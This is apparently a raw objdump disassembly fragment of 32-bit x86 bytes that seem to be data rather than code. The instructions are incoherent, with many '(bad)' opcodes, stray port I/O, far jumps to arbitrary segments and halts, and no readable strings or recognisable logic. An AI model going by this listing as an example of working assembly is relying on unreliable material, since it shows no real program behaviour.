  42d144:	fbld   TBYTE PTR [edi]
  42d146:	adc    ebp,ebx
  42d148:	pop    esi
  42d149:	sub    eax,0x2c433680
  42d14e:	dec    ebx
  42d14f:	xchg   ecx,eax
  42d150:	les    esp,FWORD PTR [eax-0x9]
  42d153:	cmp    BYTE PTR [edi+0x2b6d0e6f],ch
  42d159:	mov    dl,0x54
  42d15b:	add    eax,0x193de85e
  42d160:	fistp  DWORD PTR [esi+0x13]
  42d163:	adc    eax,0xaab460f5
  42d168:	retf   
  42d169:	mov    ah,0xda
  42d16b:	sub    al,0xb6
  42d16d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d16e:	out    dx,al
  42d16f:	push   esp
  42d170:	push   es
  42d171:	add    esi,0xa02ed026
  42d177:	mov    eax,ds:0xc2050050
  42d17c:	gs jno 0x42d157
  42d17f:	outs   dx,DWORD PTR ds:[esi]
  42d180:	pop    ebp
  42d181:	xchg   BYTE PTR [esi-0x2bf93670],ah
  42d187:	and    eax,0xa0b566a2
  42d18c:	scas   eax,DWORD PTR es:[edi]
  42d18d:	test   eax,0x76b310a4
  42d192:	(bad)  
  42d193:	mov    ds:0xfa2cb85e,al
  42d198:	or     al,0x6
  42d19a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d19b:	sub    WORD PTR [ecx+0x4f],sp
  42d19f:	(bad)  
  42d1a0:	test   al,0x14
  42d1a2:	repz iret 
  42d1a4:	push   esp
  42d1a5:	shl    bh,1
  42d1a7:	shl    ah,cl
  42d1a9:	jecxz  0x42d189
  42d1ab:	enter  0xf88e,0x39
  42d1af:	test   BYTE PTR [ebp+0x53],dl
  42d1b2:	pop    es
  42d1b3:	add    DWORD PTR [edx+ebx*4-0x52],edi
  42d1b7:	xchg   ebx,eax
  42d1b8:	jae    0x42d16a
  42d1ba:	cdq    
  42d1bb:	clc    
  42d1bc:	pop    esi
  42d1bd:	and    al,0xb6
  42d1bf:	xchg   ecx,eax
  42d1c0:	sahf   
  42d1c1:	add    al,al
  42d1c3:	xor    dh,BYTE PTR [ecx-0x392eb9a0]
  42d1c9:	inc    esp
  42d1ca:	clc    
  42d1cb:	push   esp
  42d1cc:	mov    eax,0x7ae362bd
  42d1d1:	mov    esi,ebp
  42d1d3:	dec    edx
  42d1d4:	test   BYTE PTR [edx],cl
  42d1d6:	mov    DWORD PTR [esi-0x5a],esp
  42d1d9:	lods   al,BYTE PTR ds:[esi]
  42d1da:	mov    esi,0x70e31aa0
  42d1df:	scas   al,BYTE PTR es:[edi]
  42d1e0:	icebp  
  42d1e1:	je     0x42d261
  42d1e3:	dec    edx
  42d1e4:	pop    esi
  42d1e5:	dec    eax
  42d1e6:	mov    edx,0xf954da2
  42d1eb:	into   
  42d1ec:	mov    dl,al
  42d1ee:	jno    0x42d191
  42d1f0:	push   edx
  42d1f1:	adc    DWORD PTR [edi],ebp
  42d1f3:	scas   al,BYTE PTR es:[di]
  42d1f5:	or     ecx,DWORD PTR [ecx-0x6ad4a1e5]
  42d1fb:	and    al,0x19
  42d1fd:	fnstsw WORD PTR [eax]
  42d1ff:	jmp    FWORD PTR [esi+0x4c]
  42d202:	xchg   DWORD PTR [edx-0x1b],ebx
  42d205:	shr    ch,0x69
  42d208:	out    dx,al
  42d209:	cmp    dl,BYTE PTR [edi]
  42d20b:	rol    DWORD PTR [eax],1
  42d20d:	mov    ebp,0x97546820
  42d212:	add    eax,0x93dbde18
  42d217:	imul   esp,DWORD PTR [esp+ebp*1-0x7f],0x91211893
  42d21f:	lahf   
  42d220:	in     al,0xda
  42d222:	mov    gs,WORD PTR ds:0xe40997c5
  42d228:	pop    ebp
  42d229:	js     0x42d1da
  42d22b:	ficom  WORD PTR [edx+0x3e40332e]
  42d231:	mov    ah,0xb
  42d233:	mov    ds:0x3565e81c,al
  42d238:	inc    esi
  42d239:	aam    0xab
  42d23b:	pop    esp
  42d23c:	aam    0x64
  42d23e:	out    dx,al
  42d23f:	data16 lahf 
  42d241:	adc    eax,0x7d0850c9
  42d246:	jns    0x42d1f3
  42d248:	add    ah,dh
  42d24a:	outs   dx,BYTE PTR ds:[esi]
  42d24b:	xchg   esi,eax
  42d24c:	pop    ebx
  42d24d:	pusha  
  42d24e:	jl     0x42d2aa
  42d250:	sbb    edx,DWORD PTR [ebp-0xb8c6312]
  42d256:	xchg   ecx,eax
  42d257:	jns    0x42d27d
  42d259:	lock imul esp,DWORD PTR [ecx+0x6b55c629],0x2059f735
  42d264:	pop    esi
  42d265:	jnp    0x42d2cd
  42d267:	add    BYTE PTR [ecx+0x63],0x46
  42d26b:	(bad)  
  42d26c:	jne    0x42d2ce
  42d26e:	jns    0x42d296
  42d270:	retf   0x1e09
  42d273:	or     eax,0x83f0c5fb
  42d278:	jmp    0xae2e:0x934fc55e
  42d27f:	xor    al,0x62
  42d281:	pop    ds
  42d282:	sub    eax,0x7860e302
  42d287:	outs   dx,DWORD PTR ds:[esi]
  42d288:	xor    edx,eax
  42d28a:	int3   
  42d28b:	jae    0x42d2ec
  42d28d:	enter  0xcaee,0xf5
  42d291:	sub    dh,BYTE PTR [esi+0x569f7979]
  42d297:	mov    eax,ds:0xca8ef649
  42d29c:	std    
  42d29d:	jg     0x42d30f
  42d29f:	fs pop esi
  42d2a1:	xor    ah,BYTE PTR [ecx]
  42d2a3:	sub    ebx,DWORD PTR [esi]
  42d2a5:	dec    ecx
  42d2a6:	enter  0xa2f0,0x60
  42d2aa:	push   0xf33cbf06
  42d2af:	out    0x89,al
  42d2b1:	jmp    0x40d2:0xa1094eee
  42d2b8:	mov    WORD PTR [edx+0x710e9573],ds
  42d2be:	sbb    DWORD PTR [edx],edi
  42d2c0:	pop    ebp
  42d2c1:	mov    bh,0x45
  42d2c3:	pop    ds
  42d2c4:	xchg   esp,eax
  42d2c5:	dec    ebx
  42d2c6:	imul   edi,DWORD PTR [ecx+0x77],0x7dd2ee3b
  42d2cd:	adc    sp,WORD PTR [ebp+ebp*4-0x15]
  42d2d2:	call   0xd482b477
  42d2d7:	jnp    0x42d2f4
  42d2d9:	das    
  42d2da:	xor    BYTE PTR [esi+ebx*2-0x73d269fb],al
  42d2e1:	enter  0x773f,0x38
  42d2e5:	popa   
  42d2e6:	hlt    
  42d2e7:	retf   0xa7da
  42d2ea:	das    
  42d2eb:	ins    DWORD PTR es:[edi],dx
  42d2ec:	inc    eax
  42d2ed:	mov    bh,bh
  42d2ef:	ss push ecx
  42d2f1:	cli    
  42d2f2:	stos   DWORD PTR es:[edi],eax
  42d2f3:	add    al,0xbf
  42d2f5:	and    BYTE PTR [ecx+0x70],dl
  42d2f8:	dec    edi
  42d2f9:	outs   dx,DWORD PTR ds:[esi]
  42d2fa:	popa   
  42d2fb:	popa   
  42d2fc:	out    dx,eax
  42d2fd:	or     al,0xcd
  42d2ff:	mov    al,ds:0x2f4a617
  42d304:	ins    BYTE PTR es:[edi],dx
  42d305:	push   ebx
  42d306:	dec    eax
  42d307:	or     al,0x5e
  42d309:	enter  0x840a,0xd6
  42d30d:	scas   eax,DWORD PTR es:[edi]
  42d30e:	push   ebx
  42d30f:	pusha  
  42d310:	cs popa 
  42d312:	push   cs
  42d313:	mov    al,ds:0x4d2b83f5
  42d318:	popa   
  42d319:	(bad)  
  42d31a:	out    dx,al
  42d31b:	dec    esi
  42d31c:	popf   
  42d31d:	cmp    DWORD PTR [edi+0x26be02e0],esi
  42d323:	icebp  
  42d324:	outs   dx,BYTE PTR ds:[esi]
  42d325:	pusha  
  42d326:	xor    al,0x4c
  42d328:	inc    esp
  42d329:	push   es
  42d32a:	enter  0xd5a7,0x56
  42d32e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d32f:	jmp    0xee93:0x520a475e
  42d336:	push   ds
  42d337:	cmp    eax,0xc49360cf
  42d33c:	shl    DWORD PTR ds:0x8865c07c,1
  42d342:	out    dx,al
  42d343:	(bad)  
  42d344:	jl     0x42d378
  42d346:	das    
  42d347:	pop    ss
  42d348:	inc    ecx
  42d349:	out    0x42,eax
  42d34b:	mov    eax,ds:0x81a76b76
  42d350:	ret    0x605d
  42d353:	js     0x42d3b3
  42d355:	xchg   ebx,eax
  42d356:	mov    ah,0x10
  42d358:	outs   dx,BYTE PTR ds:[esi]
  42d359:	cs in  eax,dx
  42d35b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d35c:	mov    ah,0x60
  42d35e:	add    eax,0x3f88e4f
  42d363:	sub    al,0x4f
  42d365:	jne    0x42d355
  42d367:	into   
  42d368:	xchg   ecx,eax
  42d369:	mov    dl,0xbe
  42d36b:	aad    0xd8
  42d36d:	and    eax,0x3e55a0d4
  42d372:	adc    eax,0x2f6e700d
  42d377:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d378:	xor    DWORD PTR [esi+0x5e35c911],edx
  42d37e:	or     DWORD PTR [eax],eax
  42d380:	in     al,0x4c
  42d382:	jne    0x42d3d4
  42d384:	jp     0x42d3d6
  42d386:	cs xchg ecx,eax
  42d388:	cmc    
  42d389:	cmp    BYTE PTR [ecx-0x79a4e10b],bh
  42d38f:	cmp    eax,0xc1269371
  42d394:	pop    esi
  42d395:	sti    
  42d396:	(bad)  
  42d397:	(bad)  
  42d398:	mov    bh,0xf2
  42d39a:	xor    al,0x1c
  42d39c:	adc    eax,0xdcfc4c61
  42d3a1:	push   0x6
  42d3a3:	push   0x6b
  42d3a5:	sub    dh,ch
  42d3a7:	sub    bl,BYTE PTR [edi+esi*1-0x3cb28657]
  42d3ae:	mul    DWORD PTR [eax-0x59ffabd9]
  42d3b4:	icebp  
  42d3b5:	cli    
  42d3b6:	push   es
  42d3b7:	jle    0x42d417
  42d3b9:	sub    ecx,DWORD PTR [esi+0x48]
  42d3bc:	pop    ebp
  42d3bd:	or     esp,edi
  42d3bf:	jmp    0x727c:0xd2ec60aa
  42d3c6:	jns    0x42d3b4
  42d3c8:	repz sub esi,0x7eeb7919
  42d3cf:	sti    
  42d3d0:	fs jb  0x42d444
  42d3d3:	lods   al,BYTE PTR ds:[esi]
  42d3d4:	sub    DWORD PTR [esi+ebp*2],ebx
  42d3d7:	pop    edi
  42d3d8:	xor    ah,BYTE PTR [edi]
  42d3da:	pop    ebp
  42d3db:	dec    esp
  42d3dc:	retf   
  42d3dd:	or     dh,ch
  42d3df:	mov    WORD PTR [edi-0x11],ds
  42d3e2:	jg     0x42d452
  42d3e4:	out    0x1,eax
  42d3e6:	add    BYTE PTR [ecx-0x5c],0x97
  42d3ea:	lahf   
  42d3eb:	mov    eax,ds:0x3269f1f3
  42d3f0:	out    dx,al
  42d3f1:	xchg   esi,eax
  42d3f2:	scas   eax,DWORD PTR es:[edi]
  42d3f3:	push   edx
  42d3f4:	xchg   DWORD PTR [eax-0x3a],esi
  42d3f7:	mov    esp,0x13ee9df2
  42d3fc:	pop    ebp
  42d3fd:	sub    ax,0xb304
  42d401:	cld    
  42d402:	mov    eax,ds:0x141c77a1
  42d407:	in     al,dx
  42d408:	inc    ebx
  42d409:	xor    BYTE PTR [esi],bl
  42d40b:	mov    WORD PTR [esi+0x78],ds
  42d40e:	adc    eax,DWORD PTR [esi+edx*2-0x34acc453]
  42d415:	pusha  
  42d416:	mov    ebp,0x90a0817b
  42d41b:	call   0x83659c45
  42d420:	int    0x60
  42d422:	sub    eax,0xdf8bfb4c
  42d427:	pushf  
  42d428:	scas   eax,DWORD PTR es:[edi]
  42d429:	push   edi
  42d42a:	adc    BYTE PTR ds:0xb6eeefa5,dl
  42d430:	sub    ebp,DWORD PTR [eax+0x5a]
  42d433:	pop    edi
  42d434:	pop    esi
  42d435:	in     al,0xda
  42d437:	inc    eax
  42d438:	xor    BYTE PTR [edi-0x39],0x37
  42d43c:	jns    0x42d48f
  42d43e:	sar    ecx,0xaf
  42d441:	and    cl,BYTE PTR [esi+0x4e]
  42d444:	in     eax,dx
  42d445:	dec    esi
  42d446:	inc    ebp
  42d447:	push   es
  42d448:	pop    esi
  42d449:	loope  0x42d461
  42d44b:	dec    ecx
  42d44c:	ret    0x9630
  42d44f:	outs   dx,BYTE PTR ds:[esi]
  42d450:	lods   eax,DWORD PTR ds:[esi]
  42d451:	jb     0x42d46d
  42d453:	add    DWORD PTR [eax+0x52e8b560],eax
  42d459:	repz xor BYTE PTR [ebx+edx*2+0x62],dl
  42d45e:	ret    0x53b6
  42d461:	or     ch,BYTE PTR [esi]
  42d463:	cmp    DWORD PTR [ecx-0x6e],ebx
  42d466:	push   eax
  42d467:	sub    al,0x76
  42d469:	inc    ebx
  42d46a:	push   ecx
  42d46b:	in     al,0x24
  42d46d:	mov    al,ds:0x773d43a0
  42d472:	adc    eax,0xed496271
  42d477:	or     BYTE PTR [eax+0x0],bl
  42d47a:	aas    
  42d47b:	aaa    
  42d47c:	aaa    
  42d47d:	sti    
  42d47e:	push   edx
  42d47f:	mov    al,0xbe
  42d481:	pusha  
  42d482:	xor    BYTE PTR [edi+0x238749f1],bh
  42d488:	jae    0x42d4fd
  42d48a:	out    dx,al
  42d48b:	fidivr WORD PTR gs:[edx]
  42d48e:	xchg   esi,eax
  42d48f:	xlat   BYTE PTR ds:[ebx]
  42d490:	push   eax
  42d491:	outs   dx,BYTE PTR ds:[esi]
  42d492:	push   es
  42d493:	lea    ecx,[ebx]
  42d495:	and    BYTE PTR [eax],ah
  42d497:	loope  0x42d487
  42d499:	and    DWORD PTR ds:0xeed5e118,0xffffffec
  42d4a0:	xchg   esp,eax
  42d4a1:	mov    eax,0xf563cc3a
  42d4a6:	enter  0x9ea0,0xef
  42d4aa:	in     eax,dx
  42d4ab:	shl    WORD PTR [ebx+eiz*1+0x691f5e59],0x42
  42d4b4:	in     eax,0xc1
  42d4b6:	pushf  
  42d4b7:	repz add DWORD PTR [ebx-0x4d],edi
  42d4bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d4bc:	mov    ah,BYTE PTR [eax-0x2c]
  42d4bf:	xor    esp,eax
  42d4c1:	in     eax,0x48
  42d4c3:	rcr    BYTE PTR [esi-0x2f],cl
  42d4c6:	lods   al,BYTE PTR ds:[esi]
  42d4c7:	fidivr DWORD PTR [esi]
  42d4c9:	ret    0x9911
  42d4cc:	dec    edx
  42d4cd:	jge    0x42d51b
  42d4cf:	pop    edx
  42d4d0:	jl     0x42d52b
  42d4d2:	pop    ecx
  42d4d3:	aas    
  42d4d4:	aam    0x2d
  42d4d6:	les    edi,FWORD PTR [ebx-0x7a]
  42d4d9:	mov    edx,0x785f8068
  42d4de:	sub    esi,ebp
  42d4e0:	fist   WORD PTR ds:0x29b23a47
  42d4e6:	push   cs
  42d4e7:	push   ebp
  42d4e8:	push   cs
  42d4e9:	push   edx
  42d4ea:	stos   DWORD PTR es:[edi],eax
  42d4eb:	ja     0x42d48f
  42d4ed:	mov    dh,ch
  42d4ef:	pop    es
  42d4f0:	clc    
  42d4f1:	outs   dx,DWORD PTR ds:[esi]
  42d4f2:	sbb    BYTE PTR [ebp+0x70eedbf2],bl
  42d4f8:	ins    DWORD PTR es:[edi],dx
  42d4f9:	add    al,0xfa
  42d4fb:	stc    
  42d4fc:	std    
  42d4fd:	std    
  42d4fe:	mov    eax,gs:0x33fbe488
  42d504:	clc    
  42d505:	iret   
  42d506:	leave  
  42d507:	xor    BYTE PTR [ebx],dh
  42d509:	inc    esp
  42d50a:	shl    DWORD PTR [eax],1
  42d50c:	jecxz  0x42d53a
  42d50e:	sub    al,BYTE PTR [eax]
  42d510:	and    ah,BYTE PTR es:[ebx]
  42d513:	mov    eax,ds:0x7f084514
  42d518:	addr16 aad 0xb8
  42d51b:	(bad)  
  42d51c:	pop    esi
  42d51d:	leave  
  42d51e:	or     al,0xd
  42d520:	xchg   esi,eax
  42d521:	fstp   DWORD PTR [eax+0x2d615058]
  42d527:	pop    ecx
  42d528:	sub    BYTE PTR [edx],0x6c
  42d52b:	pop    ebp
  42d52c:	xlat   BYTE PTR ds:[ebx]
  42d52d:	push   0x822512ee
  42d532:	stos   DWORD PTR es:[edi],eax
  42d533:	sub    dl,BYTE PTR [esi+0x5aa24770]
  42d539:	sub    BYTE PTR [edx+0x41],0xbd
  42d53d:	push   esp
  42d53e:	inc    ecx
  42d53f:	icebp  
  42d540:	es out 0x60,al
  42d543:	push   ecx
  42d544:	pop    esi
  42d545:	cld    
  42d546:	cmc    
  42d547:	mov    ah,0xad
  42d549:	std    
  42d54a:	mov    bh,0xb5
  42d54c:	retf   0xf043
  42d54f:	sub    eax,0xb209a151
  42d554:	(bad)  
  42d555:	stc    
  42d556:	adc    al,0x2
  42d558:	cmp    cl,al
  42d55a:	fstp   QWORD PTR [edi+0x6dd4e013]
  42d560:	sahf   
  42d561:	jo     0x42d4ef
  42d563:	pop    ss
  42d564:	(bad)  
  42d565:	ficomp DWORD PTR [esi-0x35c21d60]
  42d56b:	inc    esi
  42d56c:	mov    esi,0x94ac4f87
  42d571:	ja     0x42d561
  42d573:	and    cl,BYTE PTR [ebp+0x352e2093]
  42d579:	(bad)  
  42d57b:	mov    al,ds:0x678255dd
  42d580:	and    BYTE PTR [ebp+0x65ebd89],al
  42d586:	jae    0x42d5da
  42d588:	and    eax,0x29561b2e
  42d58d:	popa   
  42d58e:	aas    
  42d58f:	sub    BYTE PTR [ecx-0x16453048],ah
  42d595:	sub    al,0x56
  42d597:	fistp  WORD PTR [ebx+0x39]
  42d59a:	pop    ss
  42d59b:	jl     0x42d53f
  42d59d:	sbb    al,0x2e
  42d59f:	cmp    eax,0xa0c5582d
  42d5a4:	mov    bl,0x23
  42d5a6:	dec    esp
  42d5a7:	jnp    0x42d55e
  42d5a9:	sti    
  42d5aa:	dec    ebp
  42d5ab:	mov    bl,0x5f
  42d5ad:	xor    esp,ebx
  42d5af:	mov    edi,0x810e0d5b
  42d5b4:	pop    ds
  42d5b5:	dec    ebp
  42d5b6:	pop    ecx
  42d5b7:	jae    0x42d5a5
  42d5b9:	add    al,0x8b
  42d5bb:	dec    edi
  42d5bc:	pop    edx
  42d5bd:	xrelease mov DWORD PTR [eax+eiz*4-0x65],edx
  42d5c2:	jp     0x42d5ff
  42d5c4:	fisub  WORD PTR [edx+esi*1]
  42d5c7:	fnstsw WORD PTR [ebp+0x42]
  42d5ca:	fucomip st,st(1)
  42d5cc:	sahf   
  42d5cd:	push   edx
  42d5ce:	out    0x61,al
  42d5d0:	pop    esi
  42d5d1:	ds cwde 
  42d5d3:	or     esi,DWORD PTR [edx-0x24]
  42d5d6:	pop    edx
  42d5d7:	jns    0x42d63e
  42d5d9:	sbb    BYTE PTR [ecx-0x371ed410],al
  42d5df:	int3   
  42d5e0:	sbb    DWORD PTR [ebx+0x7d],edx
  42d5e3:	mov    eax,ds:0xfc5f36ec
  42d5e8:	scas   al,BYTE PTR es:[edi]
  42d5e9:	inc    ebp
  42d5ea:	mov    ds:0x6c9e5e89,al
  42d5ef:	push   0xfffffffd
  42d5f1:	or     DWORD PTR [eax-0x739fb169],ecx
  42d5f7:	and    ax,0xe6e7
  42d5fb:	sahf   
  42d5fc:	(bad)  
  42d5fd:	mov    al,ds:0xf116e9c9
  42d602:	loop   0x42d59f
  42d604:	sete   BYTE PTR [ebp+0x1c]
  42d608:	leave  
  42d609:	or     esi,ebp
  42d60b:	push   0x1af3af5c
  42d610:	pusha  
  42d611:	mov    al,ds:0xc8d7fb03
  42d616:	and    ah,cl
  42d618:	dec    ebx
  42d619:	push   cs
  42d61a:	fmul   QWORD PTR [ebp+0x6288f837]
  42d620:	cdq    
  42d621:	repz push ds
  42d623:	fbld   TBYTE PTR [ecx]
  42d625:	mov    eax,ds:0x935eae73
  42d62a:	xchg   ch,bh
  42d62c:	sti    
  42d62d:	aas    
  42d62e:	hlt    
  42d62f:	ins    BYTE PTR es:[edi],dx
  42d630:	call   0x51989395
  42d635:	aad    0x48
  42d637:	push   edi
  42d638:	pop    edx
  42d639:	loop   0x42d632
  42d63b:	push   cs
  42d63c:	ins    BYTE PTR es:[edi],dx
  42d63d:	clc    
  42d63e:	out    dx,al
  42d63f:	inc    edx
  42d640:	push   edi
  42d641:	leave  
  42d642:	and    eax,DWORD PTR [edx+edx*4+0x5674645f]
  42d649:	fstp   DWORD PTR ds:[ebx-0x511e7340]
  42d650:	arpl   ax,dx
  42d652:	lds    ebx,FWORD PTR [ecx-0x5cbf72e6]
  42d658:	jl     0x42d5ef
  42d65a:	in     eax,dx
  42d65b:	push   ebx
  42d65c:	mov    bl,0xbd
  42d65e:	mov    WORD PTR [ecx+0x6],?
  42d661:	sub    BYTE PTR [ebx],0xa3
  42d664:	sbb    eax,0xd5f5f8e1
  42d669:	call   0xcc9c:0x975ed8e2
  42d670:	inc    ebx
  42d671:	and    edx,DWORD PTR [edx]
  42d673:	icebp  
  42d674:	(bad)  [eax+0x42]
  42d677:	mov    cs,WORD PTR [ebp+0x4b]
  42d67a:	adc    BYTE PTR [eax-0x30],ah
  42d67d:	jl     0x42d681
  42d67f:	lods   eax,DWORD PTR ds:[esi]
  42d680:	lods   eax,DWORD PTR ds:[esi]
  42d681:	hlt    
  42d682:	out    dx,al
  42d683:	fimul  DWORD PTR [edi]
  42d685:	mov    esp,0x61474ca5
  42d68a:	cmc    
  42d68b:	cmp    BYTE PTR [edi+0x4b],bh
  42d68e:	pop    ds
  42d68f:	adc    edi,esp
  42d691:	pop    ecx
  42d692:	(bad)  
  42d693:	jmp    0xda7102a3
  42d698:	fstp   st(3)
  42d69a:	pushf  
  42d69b:	or     ah,bl
  42d69d:	pusha  
  42d69e:	pop    ecx
  42d69f:	scas   al,BYTE PTR es:[edi]
  42d6a0:	aam    0x24
  42d6a2:	xchg   ecx,eax
  42d6a3:	jge    0x42d6db
  42d6a5:	call   0x220e:0x22a65bee
  42d6ac:	mov    eax,0x42a0dffb
  42d6b1:	inc    ebp
  42d6b2:	(bad)  
  42d6b3:	jmp    0x42d6ec
  42d6b5:	stos   DWORD PTR es:[edi],eax
  42d6b6:	mov    bh,0xe8
  42d6b8:	pop    esi
  42d6b9:	into   
  42d6ba:	adc    BYTE PTR [edi+0x50],ah
  42d6bd:	jo     0x42d733
  42d6bf:	cmp    esi,DWORD PTR [edx+0x59]
  42d6c2:	sub    al,0x1
  42d6c4:	xchg   edi,eax
  42d6c5:	push   eax
  42d6c6:	popf   
  42d6c7:	jno    0x42d6c4
  42d6c9:	add    dl,BYTE PTR [edi-0x787ad9a]
  42d6cf:	mov    WORD PTR [esi+0x29],ds
  42d6d2:	fld    TBYTE PTR es:[esi-0x255ec07d]
  42d6d9:	fnsave [eax+ebx*1]
  42d6dc:	sbb    BYTE PTR [edi+eax*4],dl
  42d6df:	outs   dx,DWORD PTR ds:[esi]
  42d6e0:	push   esp
  42d6e1:	mov    al,0x78
  42d6e3:	xchg   esi,eax
  42d6e4:	push   ds
  42d6e5:	xor    bl,BYTE PTR [edx-0x67452b54]
  42d6eb:	nop
  42d6ec:	das    
  42d6ed:	push   ebx
  42d6ee:	imul   esp,DWORD PTR [edx],0x8d431251
  42d6f4:	xchg   BYTE PTR [ecx+esi*2+0x3c425e51],cl
  42d6fb:	js     0x42d6e7
  42d6fd:	lea    edi,[ebx+0x44f08b6b]
  42d703:	mov    eax,ds:0x22edf2fd
  42d708:	xchg   esi,eax
  42d709:	mov    ebx,0x7a5f5679
  42d70e:	sbb    cl,dh
  42d710:	fbstp  TBYTE PTR [esi-0x2894be91]
  42d716:	add    al,0xa1
  42d718:	jne    0x42d6d6
  42d71a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d71b:	or     dl,BYTE PTR [ecx+0x4c]
  42d71e:	xchg   esp,eax
  42d71f:	arpl   WORD PTR [edi-0x30],bx
  42d722:	pusha  
  42d723:	in     eax,0x9d
  42d725:	mov    dh,0xbc
  42d727:	sbb    BYTE PTR [esi],dl
  42d729:	xchg   ebp,eax
  42d72a:	lods   eax,DWORD PTR ds:[esi]
  42d72b:	mov    al,ds:0xdaa3557b
  42d730:	aaa    
  42d731:	add    BYTE PTR [edi],cl
  42d733:	das    
  42d734:	pop    ebp
  42d735:	cmp    al,cl
  42d737:	inc    eax
  42d738:	in     eax,dx
  42d739:	sub    cl,al
  42d73b:	test   al,0xfe
  42d73d:	push   es
  42d73e:	out    dx,eax
  42d73f:	test   al,0x68
  42d741:	shr    ebp,1
  42d743:	test   dh,ah
  42d745:	jecxz  0x42d794
  42d747:	mov    edi,0x5501bd27
  42d74c:	pop    esi
  42d74d:	sbb    esp,DWORD PTR [ebx-0x7f]
  42d750:	dec    ecx
  42d751:	retf   0x155a
  42d754:	xlat   BYTE PTR ds:[ebx]
  42d755:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d756:	sbb    al,0xa1
  42d758:	fisub  DWORD PTR [edx+0x3e5125eb]
  42d75e:	and    al,0xff
  42d760:	arpl   WORD PTR [edx-0x5bc20a77],bx
  42d766:	jmp    0x42d758
  42d768:	pushf  
  42d769:	mov    ah,bl
  42d76b:	xor    DWORD PTR [esi-0x72db5e3],eax
  42d771:	gs push ds
  42d773:	jae    0x42d7d2
  42d775:	nop
  42d776:	jmp    0x901c3894
  42d77b:	pop    ebp
  42d77c:	aas    
  42d77d:	mov    dh,ch
  42d77f:	add    al,0x3c
  42d781:	pop    esi
  42d782:	adc    ah,dl
  42d784:	push   esp
  42d785:	mov    bh,bl
  42d787:	repnz inc ebp
  42d789:	sub    BYTE PTR [edi-0x5f],dh
  42d78c:	lahf   
  42d78d:	push   esp
  42d78e:	js     0x42d73a
  42d790:	pop    es
  42d791:	push   eax
  42d792:	les    eax,FWORD PTR [edi]
  42d794:	js     0x42d7bc
  42d796:	out    dx,al
  42d797:	lds    ebp,FWORD PTR [edi]
  42d799:	jb     0x42d7c2
  42d79b:	cmc    
  42d79c:	shl    DWORD PTR [eax+0x7f65a84a],cl
  42d7a2:	loope  0x42d81c
  42d7a4:	cmp    ah,BYTE PTR [ecx-0x489596c0]
  42d7aa:	and    eax,0x65e158df
  42d7af:	and    al,0xec
  42d7b1:	pop    edi
  42d7b2:	cwde   
  42d7b3:	retf   0x6131
  42d7b6:	lea    ebx,[ecx+0x59a6840b]
  42d7bc:	mov    ah,al
  42d7be:	out    dx,al
  42d7bf:	inc    edx
  42d7c0:	cmp    ebp,DWORD PTR [ecx+0x1d]
  42d7c3:	add    DWORD PTR [edi],0x4b9fc0bf
  42d7c9:	pop    esi
  42d7ca:	and    BYTE PTR ds:0x5c8dabe,bl
  42d7d0:	frstor [ebx-0x709fef27]
  42d7d6:	je     0x42d7c5
  42d7d8:	loope  0x42d82b
  42d7da:	dec    edx
  42d7db:	popa   
  42d7dc:	dec    esi
  42d7dd:	or     bl,BYTE PTR [ebp-0x5f]
  42d7e0:	stos   DWORD PTR es:[edi],eax
  42d7e1:	jg     0x42d7dc
  42d7e3:	mov    edi,0x6a464ad7
  42d7e8:	pop    ebx
  42d7e9:	sbb    DWORD PTR [ebx+0x7e417d1c],esi
  42d7ef:	push   esi
  42d7f0:	push   ss
  42d7f1:	fmul   QWORD PTR [esi+0x59cccea1]
  42d7f7:	jnp    0x42d783
  42d7f9:	mov    ebp,0x515ef73e
  42d7fe:	dec    ebp
  42d7ff:	inc    edx
  42d800:	stos   DWORD PTR es:[edi],eax
  42d801:	pop    ss
  42d802:	(bad)  
  42d803:	mov    ds:0xedc460fb,al
  42d808:	shl    BYTE PTR [esi+0x54],cl
  42d80b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d80c:	jecxz  0x42d7b4
  42d80e:	adc    DWORD PTR [ebp-0x6f],edi
  42d811:	pusha  
  42d812:	mov    ecx,0x315ae62f
  42d817:	mov    ds:0xa2ad97be,al
  42d81c:	nop
  42d81d:	hlt    
  42d81e:	mov    WORD PTR [ebp+0x5b],ss
  42d821:	cdq    
  42d822:	out    dx,al
  42d823:	jmp    0xb7d8:0x8e0f424b
  42d82a:	mov    cl,0x9a
  42d82c:	mov    edx,0xd328c820
  42d831:	pusha  
  42d832:	xchg   edx,eax
  42d833:	sar    al,1
  42d835:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d836:	jle    0x42d89c
  42d838:	pop    esi
  42d839:	lds    esi,FWORD PTR [eax+0x76c5a079]
  42d83f:	mov    ds:0xd6966120,eax
  42d844:	es repnz int 0x37
  42d848:	cwde   
  42d849:	cli    
  42d84a:	out    dx,al
  42d84b:	std    
  42d84c:	fiadd  WORD PTR [esi+ebx*1+0x53235b3b]
  42d853:	hlt    
  42d854:	mov    edx,0x5fbe5160
  42d859:	push   ss
  42d85a:	jne    0x42d7f9
  42d85c:	cmp    cl,0xee
  42d85f:	aad    0xb7
  42d861:	push   ss
  42d862:	aam    0xe3
  42d864:	sub    edx,esp
  42d866:	mul    BYTE PTR [eax+0x54ce07e2]
  42d86c:	fcomp  st(7)
  42d86e:	and    DWORD PTR [ecx],edx
  42d870:	pop    esi
  42d871:	popf   
  42d872:	std    
  42d873:	jmp    0xa9791f7b
  42d878:	and    DWORD PTR [ecx-0x67],esp
  42d87b:	nop
  42d87c:	jne    0x42d8ca
  42d87e:	cwde   
  42d87f:	and    DWORD PTR [edi],ecx
  42d881:	inc    ebp
  42d882:	out    dx,al
  42d883:	ret    0xb4e8
  42d886:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d887:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d888:	xor    BYTE PTR [edx-0x62],dh
  42d88b:	pushf  
  42d88c:	push   eax
  42d88d:	inc    edi
  42d88e:	in     eax,0xfa
  42d890:	fsubp  st(5),st
  42d892:	push   cs
  42d893:	call   0x3b316cc5
  42d898:	or     ebp,DWORD PTR fs:[ebx]
  42d89b:	inc    edx
